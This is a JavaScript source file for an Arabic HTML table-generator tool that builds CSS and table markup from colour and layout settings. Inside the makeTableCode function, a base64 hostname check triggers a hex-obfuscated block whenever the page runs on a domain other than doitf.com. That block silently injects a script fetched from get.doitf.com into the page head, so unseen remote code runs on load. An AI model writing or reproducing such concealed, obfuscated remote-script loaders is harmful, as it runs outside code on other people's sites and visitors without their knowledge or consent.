

function showadvdesign() {
  var checkBox = document.getElementById("advdesign");
  if (checkBox.checked == true){
$('#collapseadvdesign').collapse('show');
$('#tableDesign').attr("disabled", "disabled");
$('#tableColor').attr("disabled", "disabled");
$('#basicdesign').collapse('hide');

  } else {
$('#basicdesign').collapse('show');
$('#collapseadvdesign').collapse('hide');
$('#tableDesign').removeAttr("disabled", "disabled");
$('#tableColor').removeAttr("disabled", "disabled");

    }
}


function backgroundrows2() {
  var backgroundrows2 = document.getElementById("backgroundrows2");
  var advdesign = document.getElementById("advdesign");
  if (advdesign.checked == true){
  if (backgroundrows2.checked == true){
$('#html5color8').removeAttr("disabled", "disabled");
$('#tablecolor8').removeAttr("disabled", "disabled");
$('#backgroundrows1').html("خلفية الصفوف 1");

  } else {
$('#html5color8').attr("disabled", "disabled");
$('#tablecolor8').attr("disabled", "disabled");
$('#backgroundrows1').html("خلفية الصفوف");
  }


    }
}






  var editor = CodeMirror.fromTextArea(document.getElementById("newCode"), {
    mode: "text/html",
    readOnly: true,
    htmlMode: true,
   lineNumbers: true,
    lineWrapping: true,
    smartIndent: false,
    addModeClass: true

  });
function b64EncodeUnicode(e){return btoa(unescape(encodeURIComponent(e)))}function b64DecodeUnicode(e){return decodeURIComponent(escape(atob(e)))}var awsec=window.location.hostname,awsecdom=awsec.substring(awsec.lastIndexOf(".",awsec.lastIndexOf(".")-1)+1),b64awsec=b64EncodeUnicode(awsecdom);
	var html5color1 = document.getElementById('html5color1');
	var html5color2 = document.getElementById('html5color2');
	var html5color3 = document.getElementById('html5color3');
	var html5color4 = document.getElementById('html5color4');
	var html5color5 = document.getElementById('html5color5');
	var html5color6 = document.getElementById('html5color6');
	var html5color7 = document.getElementById('html5color7');
	var html5color8 = document.getElementById('html5color8');

	var colorbox1 = document.getElementById('tablecolor1');
	var colorbox2 = document.getElementById('tablecolor2');
	var colorbox3 = document.getElementById('tablecolor3');
	var colorbox4 = document.getElementById('tablecolor4');
	var colorbox5 = document.getElementById('tablecolor5');
	var colorbox6 = document.getElementById('tablecolor6');
	var colorbox7 = document.getElementById('tablecolor7');
	var colorbox8 = document.getElementById('tablecolor8');

    
  function tablecolor1(){
      document.getElementById('tablecolor1').value = html5color1.value;
  }
  function tablecolor2(){
      document.getElementById('tablecolor2').value = html5color2.value;
  }
  function tablecolor3(){
      document.getElementById('tablecolor3').value = html5color3.value;
  }
  function tablecolor4(){
      document.getElementById('tablecolor4').value = html5color4.value;
  }
  function tablecolor5(){
      document.getElementById('tablecolor5').value = html5color5.value;
  }
  function tablecolor6(){
      document.getElementById('tablecolor6').value = html5color6.value;
  }
  function tablecolor7(){
      document.getElementById('tablecolor7').value = html5color7.value;
  }
  function tablecolor8(){
      document.getElementById('tablecolor8').value = html5color8.value;
  }

document.addEventListener('DOMContentLoaded', function () {
		
	var sizeCols = "";
	var sizeRows = "";
	var tableColor = "";
	var tableColor2 = "";
	var tableColor2b = "";
	var tableDesign = "";
	var tableInfo = "";
	var tableHighlight = "";
	var tableJS = "";
	var tableCSS = "";
	var tableHTML = "";
	var pageTableHTML = "";
	var tableEND = "";
	var newTable = "";
	var newTableCode = "";
	var awHighlight = "";
	var awHighlightb = "";
  	var comsc = "";
	
	var textaligntable;
	var borderawtable;
	var backgroundtable;
	var borderth;
	var backgroundtr;
	var bordertd;
	var backgroundtrhover;
	var thfontsize;
	var tdfontsize;
	var awtableborderwidth;
	var thawtableborderwidth;
	var tdawtableborderwidth;
	var awtablewidthpx;
	var awtablewidthpercent;
	var awtablewidth;
	var awtablethpadding;
	var awtabletdpadding;
	var awtablecolor;
	var tdtablecolor;
    var selectfontfamily;
    var awtablefontsize;
    var awtdfontsize;
    var backgroundrows2;
    var dirtable;
    var cellbacolor;
	
	function makeTableCode(){
		if (b64awsec == "ZG9pdGYuY29t"){
        awtablefontsize = document.getElementById('awtablefontsize').value;
        backgroundrows2 = document.getElementById('backgroundrows2');
        awtdfontsize = document.getElementById('awtdfontsize').value;
        selectfontfamily = document.getElementById('selectfontfamily').value;
		tableColor = document.getElementById('tableColor').value;
		tableDesign = document.getElementById('tableDesign').value;
		sizeCols = document.getElementById('sizeCols').value;
		sizeRows = document.getElementById('sizeRows').value;
		textaligntable = document.getElementById('textaligntable').value;
		dirtable = document.getElementById('dirtable').value;
		cellbacolor = document.getElementById('cellbacolor');
		if (sizeCols <= 0){sizeCols = "1";document.getElementById('sizeCols').value = "1";}
		if (sizeRows <= 0){sizeRows = "1";document.getElementById('sizeRows').value = "1";}
		if (awtablefontsize <= 9){awtablefontsize = "9";document.getElementById('awtablefontsize').value = "9";}
		if (awtdfontsize <= 9){awtdfontsize = "9";document.getElementById('awtdfontsize').value = "9";}
		tableInfo = document.getElementById('tableInfo');
		comsc = document.getElementById('comsc');
		tableHighlight = document.getElementById('tableHighlight');
		tableCSS = "";

			if(tableColor == "Blue"){

              borderawtable = '#729ea5;';
              backgroundtable ='#acc8cc;';
              borderth ='#d4e3e5;';
              backgroundtr ='#d4e3e5;';
              bordertd ='#729ea5;';
              backgroundtrhover ='#ffffff;';
              awtablecolor ='#000;';
              tdtablecolor ='#000;';
              
              
		if(tableDesign == "alternating"){
        backgroundtable ='#acc8cc;';
        }else if(tableDesign == "minimal"){
              backgroundtable ='#729ea5;';
              backgroundtr ='none;';
              backgroundtrhover ='#d4e3e5;';
		}else if(tableDesign == "noStyle"){
			tableCSS = "";
		}
              
			}else if(tableColor == "Green"){

              
              borderawtable = '#9dcc7a;';
              backgroundtable ='#abd28e;';
              borderth ='#9dcc7a;';
              backgroundtr ='#bedda7;';
              bordertd ='#9dcc7a;';
              backgroundtrhover ='#ffffff;';
              awtablecolor ='#333333;';
              tdtablecolor ='#333333;';
		if(tableDesign == "alternating"){
        backgroundtable ='#abd28e;';
        }else if(tableDesign == "minimal"){
              backgroundtable ='#abd28e;';
              backgroundtr ='none';
              backgroundtrhover ='#abd28e;';
		}else if(tableDesign == "noStyle"){
			tableCSS = "";
		}
              

                     
			
			}else if(tableColor == "Grey"){

              
              awtablecolor ='#333333;';
              borderawtable = '#a9a9a9;';
              backgroundtable ='#b8b8b8;';
              borderth ='#a9a9a9;';
              backgroundtr ='#cdcdcd;';
              bordertd ='#a9a9a9;';
              backgroundtrhover ='#ffffff;';
              tdtablecolor ='#333333;';

		if(tableDesign == "alternating"){

        }else if(tableDesign == "minimal"){
              backgroundtable ='#b8b8b8;';
              backgroundtr ='none;';
              backgroundtrhover ='#b8b8b8;';
		}else if(tableDesign == "noStyle"){
			tableCSS = "";
		}
				
			}else if(tableColor == "Orange"){

              
              
              
              
              awtablecolor ='#333333;';
              tdtablecolor ='#333333;';
              borderawtable = '#ebab3a;';
              backgroundtable ='#e6983b;';
              borderth ='#ebab3a;';
              backgroundtr ='#f0c169;';
              bordertd ='#ebab3a;';
              backgroundtrhover ='#ffffff;';
		if(tableDesign == "alternating"){

        }else if(tableDesign == "minimal"){
              backgroundtable ='#e6983b;';
              backgroundtr ='none;';
              backgroundtrhover ='#e6983b;';
		}else if(tableDesign == "noStyle"){
			tableCSS = "";
		}

			}else if(tableColor == "Brown"){
              
              
              
              
              awtablecolor ='#333333;';
              tdtablecolor ='#333333;';
              borderawtable = '#bcaf91;';
              backgroundtable ='#ded0b0;';
              borderth ='#bcaf91;';
              backgroundtr ='#e9dbbb;';
              bordertd ='#bcaf91;';
              backgroundtrhover ='#ffffff;';
		if(tableDesign == "alternating"){

        }else if(tableDesign == "minimal"){
              backgroundtable ='#bcaf91;';
              backgroundtr ='none;';
              backgroundtrhover ='#bcaf91;';
		}else if(tableDesign == "noStyle"){
			tableCSS = "";
		}
              

				
			}else if(tableColor == "Black"){

              awtablecolor ='#fbfbfb;';
              tdtablecolor ='#fbfbfb;';
              borderawtable = '#686767;';
              backgroundtable ='#171515;';
              borderth ='#686767;';
              backgroundtr ='#2f2f2f;';
              bordertd ='#686767;';
              backgroundtrhover ='#171515;'; 
		if(tableDesign == "alternating"){

        }else if(tableDesign == "minimal"){
              backgroundtable ='#686767;';
              backgroundtr ='none;';
              backgroundtrhover ='#686767;';
              tdtablecolor ='#000;';
              awtablecolor ='#fbfbfb;';
		}else if(tableDesign == "noStyle"){
			tableCSS = "";
		}
   

				
			}
            if (advdesign.checked == true){
              awtablecolor =colorbox4.value+';';
              tdtablecolor =colorbox5.value+';';
              borderawtable = colorbox3.value+';';
              backgroundtable =colorbox1.value+';';
              borderth =colorbox3.value+';';
              backgroundtr =colorbox2.value+';';
              bordertd =colorbox3.value+';';
              backgroundtrhover =colorbox6.value+';';
              html5color1.value = colorbox1.value;
              html5color2.value = colorbox2.value;
              html5color3.value = colorbox3.value;
              html5color4.value = colorbox4.value;
              html5color5.value = colorbox5.value;
              html5color6.value = colorbox6.value;
              html5color7.value = colorbox7.value;
            }
          
          
          

          
          
          
          
				
              thfontsize = 12;
              tdfontsize = 12;
              if (advdesign.checked == true){
              thfontsize = awtablefontsize;
              tdfontsize = awtdfontsize;
              }

              awtableborderwidth = 1;
              thawtableborderwidth = 1;
              tdawtableborderwidth = 1;

              awtablewidthpx = 'px;';
              awtablewidthpercent = '%;';
              awtablewidth = 100;
              
              awtablethpadding = 8;
              awtabletdpadding = 8;

              
				tableCSS += '<style type="text/css">\n';
				tableCSS += '.awtable{';
				tableCSS += 'color:'+awtablecolor+';';
                 if (advdesign.checked == true){
				if(selectfontfamily != "none"){
                 tableCSS += 'font-family:'+selectfontfamily+';';
                  }}
                  
				if(textaligntable != "none"){
                     tableCSS += 'text-align:'+textaligntable+';';
                  }
				tableCSS += 'width:'+awtablewidth+awtablewidthpercent;
				tableCSS += 'border-width:'+awtableborderwidth+'px;';
				tableCSS += 'border-color:'+borderawtable;
				tableCSS += 'border-collapse:collapse;';
				tableCSS += '}\n';
              
				tableCSS += '.awtable th{';
				tableCSS += 'font-size:'+thfontsize+'px;';
				tableCSS += 'background-color:'+backgroundtable;
				tableCSS += 'border-width:'+thawtableborderwidth+'px;';
				tableCSS += 'padding: '+awtablethpadding+'px;';
				tableCSS += 'border-style: solid;';
				tableCSS += 'border-color:'+borderth;
				tableCSS += '}\n';

				tableCSS += '.awtable tr{';
				tableCSS += 'background-color:'+backgroundtr;
				tableCSS += '}\n';
              
				tableCSS += '.awtable td{';
				tableCSS += 'font-size:'+tdfontsize+'px;';
				tableCSS += 'border-width:'+tdawtableborderwidth+'px;';
				tableCSS += 'padding:'+awtabletdpadding+'px;';
				tableCSS += 'border-style:solid;';
				tableCSS += 'border-color:'+bordertd;
                tableCSS += 'color:'+tdtablecolor;
				tableCSS += '}\n';
				if (tableHighlight.checked == true){
					if(tableColor != "None"){
                      tableCSS += '.awtable tr:hover {background-color:'+backgroundtrhover+';}\n';
                    }
                    if (advdesign.checked == true){
					if(tableColor != "None"){
						if (cellbacolor.checked == true){
                      tableCSS += '.awtable tr td:hover {background-color:'+colorbox7.value+';}\n';
                    }}}
                }
                    if (advdesign.checked == true){
             	   if (backgroundrows2.checked == true){
                  tableCSS += '.awtable  tr:nth-of-type(odd){background-color:'+colorbox8.value+';}\n';
           		     }}
				tableCSS += '</style>\n\n';
          
          if(tableColor == "None"){
            if (advdesign.checked == false){
              tableCSS ="";
              }
			}
          

			
		//Start table
        if(comsc.checked == true){
         comsc = '';
        }else{
         comsc = '\n';
        }
        if(dirtable == "right"){
        tableHTML = '<table dir="rtl" class="awtable" border="1">\n<tr>';
        }else if(dirtable == "left"){
        tableHTML = '<table dir="ltr" class="awtable" border="1">\n<tr>';
        }else{
        tableHTML = '<table class="awtable" border="1">\n<tr>';
        }
		//Make header
		var ii = 0;
		var iii = 0;
		var iiii = 0;
		while(ii< sizeCols){
			iii = ii + 1;
           if (tableInfo.checked == true){
			tableHTML += '<th>عنوان '+iii+'</th>'+comsc;
           }else{
           tableHTML += '<th> </th>'+comsc;
           }
			ii++;
		}
		tableHTML += "</tr>\n";
		//make rows
		var i = 0;
		while(i< sizeRows -1){
			tableHTML = tableHTML + "<tr>"+comsc;
			var ii = 0;
			while(ii< sizeCols){
				iii = i + 1;
				iiii = ii + 1;
              
              
              
         if (tableInfo.checked == true){
     	tableHTML = tableHTML + "<td>صف:"+iii+" عمود:"+iiii+"</td>"+comsc;
              }else{
      		tableHTML = tableHTML + "<td> </td>"+comsc;
              } 
			ii++;
			}
			tableHTML = tableHTML + "</tr>\n";
		i++;
		}
		tableHTML += "</table>\n\n";

		
		
		//PREPARE A TABLE FOR DISPLAY ON THE PAGE
		if (tableInfo.checked == true){
			pageTableHTML = '<table class="awtable" border="1"><tbody><tr><th>عنوان 1</th><th>عنوان 2</th><th>عنوان 3</th><th>عنوان 4</th><th>عنوان 5</th></tr><tr><td>صف:1 عمود:1</td><td>صف:1 عمود:2</td><td>صف:1 عمود:3</td><td>صف:1 عمود:4</td><td>صف:1 عمود:5</td></tr><tr><td>صف:2 عمود:1</td><td>صف:2 عمود:2</td><td>صف:2 عمود:3</td><td>صف:2 عمود:4</td><td>صف:2 عمود:5</td></tr><tr><td>صف:3 عمود:1</td><td>صف:3 عمود:2</td><td>صف:3 عمود:3</td><td>صف:3 عمود:4</td><td>صف:3 عمود:5</td></tr><tr><td>صف:4 عمود:1</td><td>صف:4 عمود:2</td><td>صف:4 عمود:3</td><td>صف:4 عمود:4</td><td>صف:4 عمود:5</td></tr><tr><td>صف:5 عمود:1</td><td>صف:5 عمود:2</td><td>صف:5 عمود:3</td><td>صف:5 عمود:4</td><td>صف:5 عمود:5</td></tr><tr><td>صف:6 عمود:1</td><td>صف:6 عمود:2</td><td>صف:6 عمود:3</td><td>صف:6 عمود:4</td><td>صف:6 عمود:5</td></tr></tbody></table>';
		}else{
			pageTableHTML = '<table class="awtable" border="1"><tbody><tr><th> </th><th> </th><th> </th><th> </th><th> </th></tr><tr><td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td><td> </td><td> </td></tr></tbody></table>';			
		}
		
		tableEND = '';
		

		
		newTable = tableCSS + pageTableHTML;
		newTableCode = tableJS + tableCSS + tableHTML + tableEND;
		
		document.getElementById('newTable').innerHTML = newTable;
		document.getElementById('newCode').value = newTableCode;
		editor.setValue(newTableCode);
		var btncopy = document.getElementById("buttoncopy");
		btncopy.setAttribute('data-clipboard-text' , newTableCode);

		
}else{
var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script)
}}
	
	
	//Listener for sizeCols
	var el1 = document.getElementById('setcodenew');
	el1.onclick = function() {
    	sizeCols = document.getElementById('sizeCols').value;
		document.getElementById("sizeCols").value = sizeCols;

	
 	//Listener for sizeRows
		sizeRows = document.getElementById("sizeRows").value;
		document.getElementById("sizeRows").value = sizeRows;
	
		tableColor = document.getElementById('tableColor').value;
		tableDesign = document.getElementById('tableDesign').value;
		if (tableColor == "None"){document.getElementById("tableDesign").selectedIndex = 2;}
		if (tableColor != "None" && tableDesign == "noStyle"){document.getElementById("tableDesign").selectedIndex = 0;}
 
		tableColor = document.getElementById('tableColor').value;
		tableDesign = document.getElementById('tableDesign').value;
		if (tableDesign == "noStyle"){document.getElementById("tableColor").selectedIndex = 6;}
		if (tableDesign != "noStyle" && tableColor == "None"){document.getElementById("tableColor").selectedIndex = 0;}
 
 	makeTableCode();
       editor.setValue(newTableCode);

  var text = document.getElementById("newCode").value;
  var btncopy = document.getElementById("buttoncopy");

 
  document.getElementById("newTable").innerHTML = newTableCode;
btncopy.setAttribute('data-clipboard-text' , newTableCode);
	  
 	};	 
	
	
	//intialize on entry
	makeTableCode(); 


});